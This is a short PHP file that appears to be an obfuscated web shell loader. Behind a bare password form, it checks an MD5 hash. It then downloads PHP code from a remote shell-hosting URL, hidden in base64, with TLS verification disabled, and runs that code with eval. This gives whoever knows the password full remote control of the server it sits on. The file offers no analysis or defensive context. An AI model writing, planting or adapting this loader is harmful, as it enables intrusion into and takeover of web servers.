<?php
session_start();

@error_reporting(0);

function g($u) {
    if (function_exists(base64_decode('Y3VybF9leGVj'))) {
        $c = curl_init($u);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_USERAGENT, base64_decode('TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBydjoxLjApIEdlY2tvLzIwMDEwMTAxIEZpcmVmb3gvMzIuMA=='));
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION[base64_decode('Y29raQ==')])) {
            curl_setopt($c, CURLOPT_COOKIE, $_SESSION[base64_decode('Y29raQ==')]);
        }

        $d = curl_exec($c);
        curl_close($c);
    } elseif (function_exists(base64_decode('ZmlsZV9nZXRfY29udGVudHM='))) {
        $d = file_get_contents($u);
    } elseif (function_exists(base64_decode('Zm9wZW4=')) && function_exists(base64_decode('c3RyZWFtX2dldF9jb250ZW50cw=='))) {
        $h = fopen($u, base64_decode('cg=='));
        $d = stream_get_contents($h);
        fclose($h);
    } else {
        $d = false;
    }
    return $d;
}

function l()
{
    return isset($_SESSION[base64_decode('bG9nZ2VkX2lu')]) && $_SESSION[base64_decode('bG9nZ2VkX2lu')] === true;
}

if (isset($_POST[base64_decode('cGFzc3dvcmQ=')])) {
    $p = $_POST[base64_decode('cGFzc3dvcmQ=')];
    $h = base64_decode('ZjAwNDg2OWUxNDg0MTU4MmIxYTI4Yjg0NDM3ZWM5NzA=');
    if (md5($p) === $h) {
        $_SESSION[base64_decode('bG9nZ2VkX2lu')] = true;
        $_SESSION[base64_decode('Y29raQ==')] = base64_decode('YXN1');
    } else {
        echo base64_decode('SW5jb3JyZWN0IHBhc3N3b3JkLiBQbGVhc2UgdHJ5IGFnYWluLg==');
    }
}

if (l()) {
    $a = g(base64_decode('aHR0cHM6Ly9zaGVsbC5wcmluc2guY29tL05hdGhhbi9hbGZhLnR4dA=='));
    eval('?>' . $a);
} else {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title><?php echo base64_decode('TA=='); ?></title>
    </head>
    <body>
        <form method="POST" action="">
            <label for="password"><?php echo base64_decode('UA=='); ?>:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="<?php echo base64_decode('TA=='); ?>">
        </form>
    </body>
    </html>
    <?php
}
?>
